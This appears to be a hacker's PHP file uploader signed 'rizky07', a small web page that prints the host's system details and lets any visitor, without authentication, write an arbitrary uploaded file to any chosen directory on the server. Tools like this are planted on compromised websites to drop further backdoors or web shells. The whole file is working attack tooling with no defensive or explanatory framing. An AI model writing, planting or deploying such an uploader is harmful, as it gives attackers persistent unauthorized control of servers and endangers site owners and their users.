<!DOCTYPE html>
<html>
<title>Uploader By rizky07</title>
<body >
<center>
<?
echo "<h3 style='margin-top:0;margin-bottom:5px'>".php_uname()."</h3>";
?>
<form action="" method="post" enctype="multipart/form-data">
   <input type="text" style="padding:5px;border:1px solid green;width:303px;margin-bottom:4px" name="dir"  placeholder="directory">
   <input type="file" style="padding:3px;background-color:green;color:white;margin-bottom:4px" name="file" >
    <input type="submit" style="padding:3px;border:3px solid green;background-color:green;color:white;margin-bottom:4px" value="UPLOAD" name="submit">
</form>
<?
if(isset($_POST['submit'])) {
$target_dir = $_POST['dir'];
$target_file = $target_dir . basename($_FILES["file"]["name"]);

    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        echo "Yosh ! ". basename( $_FILES["file"]["name"]). " UPLOAD > OK";
    } else {
        echo "Anjing, upload gagal !";
    }
  }

?> 
</body>
</html>
